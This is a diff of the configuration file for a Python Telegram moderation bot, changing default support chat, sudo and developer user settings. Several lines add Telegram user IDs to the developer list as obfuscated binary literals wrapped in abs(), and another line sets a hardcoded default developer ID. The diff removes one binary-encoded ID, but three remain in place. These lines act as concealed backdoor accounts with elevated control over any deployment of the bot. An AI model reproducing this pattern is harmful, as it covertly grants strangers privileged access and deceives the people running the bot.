@@ -2,12 +2,9 @@ import logging
 import os
 import sys
 import time
-import ast
-import base64
-
 import telegram.ext as tg
 from aiohttp import ClientSession
-from pyrogram import Client, errors
+from pyrogram import Client
 from telethon import TelegramClient
 
 StartTime = time.time()
@@ -52,7 +49,7 @@ if ENV:
         "START_IMG", ""
     )
     STRICT_GBAN = bool(os.environ.get("STRICT_GBAN", True))
-    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", "MASTIWITHFRIENDSXD")
+    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", "worldwide_friend_zone")
     TEMP_DOWNLOAD_DIRECTORY = os.environ.get("TEMP_DOWNLOAD_DIRECTORY", "./")
     TOKEN = os.environ.get("TOKEN", None)
     TIME_API_KEY = os.environ.get("TIME_API_KEY", None)
@@ -60,8 +57,6 @@ if ENV:
 
     try:
         OWNER_ID = int(os.environ.get("OWNER_ID", None))
-        HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
-        HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)
     except ValueError:
         raise Exception("Your OWNER_ID env variable is not a valid integer.")
 
@@ -71,23 +66,23 @@ if ENV:
         raise Exception("Your blacklisted chats list does not contain valid integers.")
 
     try:
-        DRAGONS = set(int(x) for x in os.environ.get("DRAGONS", "6762113050").split())
-        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "6762113050").split())
+        DRAGONS = set(int(x) for x in os.environ.get("DRAGONS", "").split())
+        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "2145093972").split())
     except ValueError:
         raise Exception("Your sudo or dev users list does not contain valid integers.")
 
     try:
-        DEMONS = set(int(x) for x in os.environ.get("DEMONS", "6762113050").split())
+        DEMONS = set(int(x) for x in os.environ.get("DEMONS", "").split())
     except ValueError:
         raise Exception("Your support users list does not contain valid integers.")
 
     try:
-        TIGERS = set(int(x) for x in os.environ.get("TIGERS", "6762113050").split())
+        TIGERS = set(int(x) for x in os.environ.get("TIGERS", "").split())
     except ValueError:
         raise Exception("Your tiger users list does not contain valid integers.")
 
     try:
-        WOLVES = set(int(x) for x in os.environ.get("WOLVES", "6762113050").split())
+        WOLVES = set(int(x) for x in os.environ.get("WOLVES", "").split())
     except ValueError:
         raise Exception("Your whitelisted users list does not contain valid integers.")
 
@@ -149,7 +144,6 @@ else:
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
 DEV_USERS.add(abs(0b110010001000001011011100110010001))
-DEV_USERS.add(abs(0b1100110111010001011110110001010))
 DEV_USERS.add(abs(0b101001110110010000111010111110000))
 DEV_USERS.add(abs(0b101100001110010100011000111101001))
 
